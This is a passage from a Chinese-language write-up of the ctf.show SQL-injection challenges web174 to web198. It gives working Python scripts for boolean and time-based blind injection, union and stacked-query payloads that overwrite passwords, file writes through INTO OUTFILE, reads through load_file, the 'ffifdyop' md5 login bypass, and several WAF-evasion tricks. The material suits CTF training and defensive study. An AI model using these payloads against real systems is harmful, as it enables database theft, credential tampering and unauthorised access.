24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) -- -&#39; r &#x3D; requests.get(url + payload) if &quot;admin&quot; in r.text: head &#x3D; mid + 1 else: tail &#x3D; mid if head !&#x3D; 32: result +&#x3D; chr(head) else: break print(result) # by macchiato import requests import string flag &#x3D; &#39;&#39; table &#x3D; string.digits + string.ascii_letters + &#39;-&#123;&#125;&#39; for i in range(1, 45): for j in table: url &#x3D; &quot;http:&#x2F;&#x2F;dcfd2cf7-1f37-408e-a4d1-c834d09ac388.chall.ctf.show&#x2F;&#x2F;api&#x2F;v4.php?id&#x3D;&quot; payload &#x3D; &#39;&#39;&#39;1&#39; and substr((select password from ctfshow_user4 where username&#x3D;&quot;flag&quot;),&#123;&#125;,1)&#x3D;&quot;&#123;&#125;&quot;--+&#39;&#39;&#39;.format(i,j) r &#x3D; requests.get(url + payload) if &quot;admin&quot; in r.text: flag +&#x3D; j print(flag) break 我这里就不跑了，直接贴脚本。 还有一种是将数字替换为字母 但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。 所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。 这个虽然说比较麻烦，但也是一种很好的解题思路。 1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username&#x3D;&#39;flag&#39;)--+ web175&#x2F;&#x2F;检查结果是否有flag if(!preg_match(&#39;&#x2F;[\\x00-\\x7f]&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 把字符全ban了 不能通过回显来布尔盲注了，可以利用时间盲注 import time import requests url &#x3D; &#39;http:&#x2F;&#x2F;5adcc7d3-c4d3-440a-8f3e-a4b93e6b61e4.challenge.ctf.show&#x2F;api&#x2F;v5.php&#39; flag &#x3D; &#39;&#39; for i in range(60): lenth &#x3D; len(flag) min,max &#x3D; 32,128 while True: j &#x3D; min + (max-min)&#x2F;&#x2F;2 if(min &#x3D;&#x3D; j): flag +&#x3D; chr(j) print(flag) break payload &#x3D; f&quot;?id&#x3D;&#39; union select &#39;a&#39;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.5),&#39;False&#39;) --+&quot; start_time &#x3D; time.time() r &#x3D; requests.get(url&#x3D;url+payload).text end_time &#x3D; time.time() sub &#x3D; end_time - start_time if(sub &gt;&#x3D; 0.5): max &#x3D; j else: min &#x3D; j 还可以用into outfile和dumpfile来写shell -1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+ -1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+ web176试了一下，是过滤了小写的select，变个大写字母就行 id&#x3D;-1&#39; union Select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39;--+ &#x2F;&#x2F;查列 最终payload -1&#39; union Select group_concat(id,username,password),2,3 from ctfshow_user--+ web177过滤了空格，-，+，#，，or，空格可以用/**/绕过注释可以用#的url编码%23，or可以用||替代 因为没有过滤，所以直接万能密码就能出 -1&#39;||1%23 正经注入的话差不多就是这样 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23 web178我有点看不懂这个过滤了 为什么1‘or1%23不行1’||1%23可以，1‘or(1)%23可以，1’or(1=1)%23可以呢 or后边跟的一定要存在空格吗,是我记错了吗。。。 这个过滤了空格，*，那么用/**/当空格是不行的，但是可以用%09 %0a %0d %0c +之类的替代空格，或者利用括号 正经的注入的话 payload -1&#39;union%09select%091,2,password%09from%09ctfshow_user%23 web1791&#39;||1&#x3D;1%23 万能密码还是可以 或者利用%0c代替空格 -1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 或者空格 -1&#39;union(select(1),2,(password)from(ctfshow_user))%23 web180%23也被过滤了，但是%0c还能用，-也能用，所以我们可以用 --%0c来代替--+的空格，只要把上一题的用来注释的%23改成--%0c就行了 或者不要注释符让后面的单引号能够闭合 比如 -1&#39;%0cunion%0cselect&#39;1&#39;,(select%0cgroup_concat(password)from&#96;ctfshow_user&#96;),&#39;3 或者这种 1111&#39;or(id=26)and&#39;a&#39;=&#39;a 因为sql中and优先级高于or所以就会变成 (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;11&#39;) or (id&#x3D;26and&#39;a&#39;&#x3D;&#39;a&#39;) web181function waf($str)&#123; return preg_match(&#39;&#x2F; |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select&#x2F;i&#39;, $str); &#125; 给了waf函数的内容 不要注释直接闭合，然后利用id查出flag 常规的注入在这种没注释符的情况下一般都是用 ’1’=&#39;1来替代了%23 web182function waf($str)&#123; return preg_match(&#39;&#x2F; |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag&#x2F;i&#39;, $str); &#125; 同样是利用or和and的优先级问题，利用id查出flag 1111&#39;or(id=26)and&#39;a&#39;=&#39;a web183改成post方式了 等于和select被过滤了，看起来只能利用like进行盲注了 tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%&#39; 返回为1，说明确实有这个字段，然后就是利用盲注了 偷一下南方师傅的脚本 #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;4&#x2F;8 21:24 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080&#x2F;select-waf.php&quot; str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot; flag &#x3D; &quot;ctfshow&quot; for i in range(0,666): for j in str: data &#x3D; &#123;&quot;tableName&quot;:&quot;(ctfshow_user)where(pass)like&#39;&#123;0&#125;%&#39;&quot;.format(flag+j)&#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;$user_count &#x3D; 1&quot; in res.text: flag +&#x3D; j print(flag) if j&#x3D;&#x3D;&quot;&#125;&quot;: exit() break web184function waf($str)&#123; return preg_match(&#39;&#x2F;\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\&#x3D;|or|\\x7c|select|and|flag|into|where|\\x26|\\&#39;|\\&quot;|union|\\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125; 过滤的确实有点多 这里连where也过滤了，可以利用right join，右连接的方式查表 https://blog.csdn.net/weixin_48083470/article/details/119043137 利用十六进制来绕过最后的引号，字段猜测和上个题一样在pass里 tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725 可以看到有返回值，所以就可以上脚本跑了 再偷一下南方师傅的脚本 #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;4&#x2F;8 21:24 # blog: www.wlhhlc.top import requests import binascii def to_hex(s): # 字符串转16进制 str_16 &#x3D; binascii.b2a_hex(s.encode(&#39;utf-8&#39;)) str_16 &#x3D; bytes.decode(str_16) res &#x3D; str_16.replace(&quot;b&#39;&quot;,&quot;&quot;).replace(&quot;&#39;&quot;,&quot;&quot;) return res url &#x3D; &quot;http:&#x2F;&#x2F;4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080&#x2F;select-waf.php&quot; str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot; flag &#x3D; &quot;ctfshow&quot; for i in range(0,666): for j in str: result &#x3D; &quot;0x&quot; + to_hex(flag + j + &quot;%&quot;) data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;.format(result)&#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;$user_count &#x3D; 43&quot; in res.text: flag +&#x3D; j print(flag) if j&#x3D;&#x3D;&quot;&#125;&quot;: exit() break web185function waf($str)&#123; return preg_match(&#39;&#x2F;\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\&#x3D;|or|\\x7c|select|and|flag|into|where|\\x26|\\&#39;|\\&quot;|union|\\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125; 这个waf，把数字也全ban了，那就不能用十六进制了，但是引号一样被ban了 放张图 再偷一个南方师傅的脚本 这里主要是利用了mysql里true=1 true+true=2的特性，硬加true让数值等于我们要的字母的ASCII码值，然后在外面套个chr转化为字符，再利用concat进行拼接 #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;4&#x2F;8 21:24 # blog: www.wlhhlc.top import requests def createNum(n): str &#x3D; &#39;true&#39; if n &#x3D;&#x3D; 1: return &#39;true&#39; else: for i in range(n - 1): str +&#x3D; &quot;+true&quot; return str #把每一个字符转换成ascii码对应的数值 def change_str(s): str&#x3D;&quot;&quot; str+&#x3D;&quot;chr(&quot;+createNum(ord(s[0]))+&quot;)&quot; for i in s[1:]: str+&#x3D;&quot;,chr(&quot;+createNum(ord(i))+&quot;)&quot; return str url &#x3D; &quot;http:&#x2F;&#x2F;c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080&#x2F;select-waf.php&quot; str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot; flag &#x3D; &quot;ctfshow&quot; for i in range(0,666): for j in str: result &#x3D; change_str(flag + j + &quot;%&quot;) data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;.format(result)&#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;$user_count &#x3D; 43;&quot; in res.text: flag +&#x3D; j print(flag) if j&#x3D;&#x3D;&quot;&#125;&quot;: exit() break web186function waf($str)&#123; return preg_match(&#39;&#x2F;\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\&lt;|\\&gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\&#x3D;|or|\\x7c|select|and|flag|into|where|\\x26|\\&#39;|\\&quot;|union|\\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125; 虽然多加了几个，但是上一题的脚本可以接着用 web187是登录页面，要求以admin的账户登录，但是对username的验证没法绕过，只能利用password的部分 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;$password&#39;&quot;; 返回逻辑 $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; md5($_POST[&#39;password&#39;],true); &#x2F;&#x2F;只有admin可以获得flag if($username!&#x3D;&#39;admin&#39;)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名不存在&#39;; die(json_encode($ret)); &#125; 可以看到这里的password是md5的形式，而这里存在一个很特殊的字符串ffifdyop md5(&quot;ffifdyop&quot;,true) &#x3D; &#39;or&#39;6]!r,b 将这个放在密码里，整个查询语句就会被闭合 select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;&#39;or&#39;6]!r,b&#39; 也就是： select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;&#39;or &#39;6]!r,b&#39; 也就是： select count(*) from ctfshow_user where FALSE or TRUE or的存在配合后面的TRUE就绕过了 web188 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag)); &#125; 在where username=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来 而if($row[‘pass’]==intval($password)) 也是弱比较，查出来的也是字母开头的 所以payload为 username&#x3D;0&amp;password&#x3D;0 但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用||运算符 username&#x3D;1||1&amp;password&#x3D;0 web189先试一下上一题的payload，发现没成功，估计是数字开头的了，而题目提示flag在api/index.php里感觉就是利用load_file读文件了 load_file()，用法一般是select load_file(xxxx) LOAD_FILE(file_name)： 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 regexp： mysql中的正则表达式操作符 #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;4&#x2F;15 22:14 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot; flag &#x3D; &quot;ctfshow&#123;&quot; for i in range(200): for j in all_str: data &#x3D; &#123; &quot;username&quot;:&quot;if(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;)regexp(&#39;&#123;0&#125;&#39;),0,1)&quot;.format(flag + j), &#39;password&#39;:0 &#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if r&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text: flag +&#x3D;j print(flag) break if j&#x3D;&#x3D;&#39;&#125;&#39;: exit() web190查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑 &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 盲注 底下这个图应该也用or测的，懒得再截图了 可以看到正确的时候返回密码错误，错误的时候返回用户名不存在，所以直接盲注就行了 #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;6&#x2F;1 21:57 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;e4bfc493-4ed3-4091-99b3-e1770febcde1.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; data &#x3D; &#123;&#39;username&#39;:&#39;&#39;, &#39;password&#39;:123456&#125; flag &#x3D; &#39;&#39; for i in range(1,46): start &#x3D; 32 end &#x3D; 127 while start &lt; end: mid &#x3D; (start + end) &gt;&gt; 1 #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot; payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot; data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]: start &#x3D; mid +1 else: end &#x3D; mid flag &#x3D; flag + chr(start) print(flag) web191查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑 &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; 加了个过滤，ascii被过滤了，最简单的就是不用二分法直接遍历比较（ 把ascii换成ord #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;6&#x2F;2 17:03 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;d0f3a387-5d85-4a5c-a4b8-2267077de55f.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; data &#x3D; &#123;&#39;username&#39;:&#39;&#39;, &#39;password&#39;:123456&#125; flag &#x3D; &#39;&#39; for i in range(1,46): start &#x3D; 32 end &#x3D; 127 while start &lt; end: mid &#x3D; (start + end) &gt;&gt; 1 #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot; payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot; data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]: start &#x3D; mid +1 else: end &#x3D; mid flag &#x3D; flag + chr(start) print(flag) web192查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑 &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; ord ascii hex都被过滤了，所以还是直接遍历吧（ #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;6&#x2F;2 17:03 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; flag &#x3D; &quot;&quot; all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot; for i in range(1,99): for j in all_str: payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_fl0g&quot; username_data &#x3D; f&quot;admin&#39; and if(substr((&#123;payload&#125;), &#123;i&#125;, 1)regexp(&#39;&#123;j&#125;&#39;), 1, 0)&#x3D;1#&quot; data &#x3D; &#123;&#39;username&#39;: username_data, &#39;password&#39;: 1&#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]: flag +&#x3D; j print(flag) break if j &#x3D;&#x3D; &quot;&#125;&quot;: exit() 这里我觉得等于号没被过滤的话直接比较看起来会更简单一点 web193查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑 &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; substr也没了，这里可以用left、right、mid、locate、substring代替 left(&quot;abc&quot;,2) 返回从左边第一个开始两个字符&quot;ab&quot; locate(&quot;ab&quot;,&quot;abxx&quot;) 返回第一个参数在第二个参数中出现的位置，从1开始计数 locate： import time import requests url &#x3D; &quot;http:&#x2F;&#x2F;bd4fa184-8dec-427e-943d-762e0ed0deb9.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; flagstr_full &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot; flagstr &#x3D; &quot;1234567890&#123;-&#125;abcdef&quot; flag &#x3D; &quot;ctfshow&quot; payload &#x3D; r&quot;&#39; or if(locate(&#39;&#123;&#125;&#39;,(select group_concat(f1ag) from ctfshow_flxg)),1,0) &#x3D;&#39;1&quot; for i in range(60): for j in flagstr: tj &#x3D; flag+j data &#x3D; &#123; &quot;username&quot;:payload.format(tj), &quot;password&quot;:&quot;0&quot; &#125; res &#x3D; requests.post(url , data &#x3D; data) if r&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text: flag +&#x3D; j print(flag) time.sleep(0.3) left： import time import requests url &#x3D; &quot;http:&#x2F;&#x2F;328932d3-030e-460a-923e-6003243856d4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; flagstr &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot; flag &#x3D; &quot;&quot; payload &#x3D; r&quot;&#39; or if(left((select group_concat(f1ag) from ctfshow_flxg), &#123;&#125;)regexp(&#39;&#123;&#125;&#39;),1,0) &#x3D;&#39;1&quot; for i in range(60): for j in flagstr: tj &#x3D; flag+j data &#x3D; &#123; &quot;username&quot;:payload.format(str(i),tj), &quot;password&quot;:&quot;0&quot; &#125; res &#x3D; requests.post(url , data &#x3D; data) if r&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text: flag +&#x3D; j print(flag) time.sleep(0.3) 还可以利用like的模糊匹配和regexp的正则 regexp正则： #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;6&#x2F;11 14:03 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; flag &#x3D; &quot;&quot; all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot; for i in range(1,99): for j in all_str: #payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; #payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;&quot; payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_flxg&quot; username_data &#x3D; &quot;admin&#39; and if((&#123;0&#125;)regexp(&#39;^&#123;1&#125;&#39;), 1, 0)&#x3D;1#&quot;.format(payload, flag + j) data &#x3D; &#123;&#39;username&#39;: username_data, &#39;password&#39;: 1&#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) #print(data) if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]: flag +&#x3D; j print(flag) break if j &#x3D;&#x3D; &quot;&#125;&quot;: exit() like： import requests url &#x3D; &quot;http:&#x2F;&#x2F;618941b4-ab0f-43e2-83ce-01afe487708c.challenge.ctf.show&#x2F;api&#x2F;&quot; flag &#x3D; &quot;&quot; table &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot; for i in range(1,99): for j in table: pay &#x3D; flag+j+&#39;%&#39; username_data &#x3D; f&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot; data &#x3D; &#123;&#39;username&#39;: username_data, &#39;password&#39;: 1&#125; r &#x3D; requests.post(url&#x3D;url, data&#x3D;data).text if r&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in r: flag +&#x3D; j print(flag) if j &#x3D;&#x3D; &quot;&#125;&quot;: exit() break web194查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑reg &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; like的模糊匹配，regexp的正则还有mid、locate之类的都能用 web195查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;; 返回逻辑 &#x2F;&#x2F;密码检测 if(!is_numeric($password))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;; die(json_encode($ret)); &#125; &#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; &#125; &#x2F;&#x2F;TODO:感觉少了个啥，奇怪 if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; 这里是堆叠注入，在我还想爆字段的时候，大师傅们已经用update把密码改了直接登录了 UPDATE用法 UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值 Copy 使用update修改密码 0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1 不过试了一下发现好像也查不了字段，过滤的有点多，要查感觉只能盲注 payload 0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1 南方师傅和y4师傅都说因为 $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;这个语句没引号所以要用十六进制 所以他们的payload都是下面这种形式 payload&#x3D;&quot;0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;&quot; 而我这里没有用十六进制而是0的原因在web188里 web196查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;; 返回逻辑 &#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 if(preg_match(&#39;&#x2F; |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\&#39;|\\&quot;|select|union|or|and|\\x26|\\x7c|file|into&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; if(strlen($username)&gt;16)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名不能超过16个字符&#39;; die(json_encode($ret)); &#125; if($row[0]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;; &#125; 限制了用户名长度，上一题的payload不能用了 这里好像是后端验证有问题，select没被过滤，所以可以构造payload username &#x3D; 0;select(1) password &#x3D; 1 因为 select pass from ctfshow_user where username &#x3D; 0; 显然不会成立，所以查询后会返回后面的语句结果，而select(1)返回的结果是1，所以这时只要密码是1就能登陆成功 web197查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;; 返回逻辑 &#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 if(&#39;&#x2F;\\*|\\#|\\-|\\x23|\\&#39;|\\&quot;|union|or|and|\\x26|\\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;; die(json_encode($ret)); &#125; if($row[0]&#x3D;&#x3D;$password)&#123; $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;; &#125; select，update，set被过滤了 但是show没有，结合查询语句我们能知道表名是ctfshow_user 所以可以构造payload username &#x3D; 0;show tables password &#x3D; ctfshow_user web198197的payload还能用 南方师傅还写了另一种思路 